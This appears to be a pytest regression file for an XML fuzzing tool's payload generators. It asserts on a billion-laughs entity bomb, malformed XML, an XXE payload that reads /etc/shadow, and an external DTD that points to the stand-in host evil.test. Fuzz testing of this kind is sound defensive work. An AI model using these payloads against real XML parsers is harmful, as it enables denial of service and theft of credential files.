"""Regression: XML fuzz payloads must actually be bombs / malformed."""

from __future__ import annotations

import pytest

from src.fuzzing.generators.xml_payloads import (
    generate_billion_laughs,
    generate_external_dtd,
    generate_malformed_xml,
    generate_xxe_payload,
)


@pytest.mark.unit
def test_billion_laughs_chains_from_defined_root_entity() -> None:
    payload = generate_billion_laughs()
    assert "<!ENTITY lol 'lol'>" in payload
    assert "<!ENTITY l1 '&lol;&lol;&lol;'>" in payload
    assert "<!ENTITY l2 '&l1;&l1;&l1;'>" in payload
    assert "<!ENTITY l6 '&l5;&l5;&l5;'>" in payload
    assert "&l0;" not in payload
    assert payload.endswith("<lolz>&l6;</lolz>")


@pytest.mark.unit
def test_malformed_xml_does_not_include_well_formed_document() -> None:
    payloads = generate_malformed_xml()
    assert "<?xml version='1.0'?><root/>" not in payloads
    assert any("<root>" in item and "</root>" not in item for item in payloads if item)
    assert payloads[0] == ""
    assert any("orphan" in item for item in payloads)


@pytest.mark.unit
def test_xxe_and_external_dtd_payloads() -> None:
    xxe = generate_xxe_payload("/etc/shadow")
    assert "file:///etc/shadow" in xxe
    assert "&xxe;" in xxe
    dtd = generate_external_dtd("http://evil.test/x.dtd")
    assert "SYSTEM 'http://evil.test/x.dtd'" in dtd
